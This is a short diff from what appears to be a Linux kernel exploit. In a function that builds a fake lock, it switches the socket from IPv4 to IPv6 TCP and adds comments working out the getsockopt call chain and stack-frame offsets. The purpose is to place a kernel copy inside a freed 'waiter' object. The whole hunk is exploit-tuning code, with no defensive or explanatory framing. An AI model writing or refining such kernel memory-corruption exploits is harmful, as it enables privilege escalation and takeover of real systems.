@@ -72,11 +72,12 @@ RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
     uint16_t family = AF_UNSPEC;
     memcpy(stamp + 8, &family, sizeof(family));
 
-    /* TCP (not UDP): tcp_getsockopt() forwards every non-SOL_TCP level to
-     * icsk_af_ops->getsockopt == ip_getsockopt, which adds its own 0x40 frame
-     * and moves the copy 0x30 deeper - exactly the offset that puts the whole
-     * dead waiter inside the 0x90-byte buffer. No connection is needed. */
-    int fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+    /* AF_INET6 + SOCK_STREAM: tcp_getsockopt() tail-calls icsk_af_ops->getsockopt
+     * == ipv6_getsockopt, whose SOL_IP branch calls udp_prot.getsockopt (a real
+     * call) before ip_getsockopt() reaches do_ip_getsockopt(); the extra 0x50
+     * frame drops the copy from 0x788 (AF_INET/TCP) to 0x7e8, i.e. inside the
+     * waiter's 0x58 bytes with mcast_waiter_off = 0x20. No connection needed. */
+    int fd = socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
     if (fd < 0) {
         status.step = 60;
         status.error_number = errno;
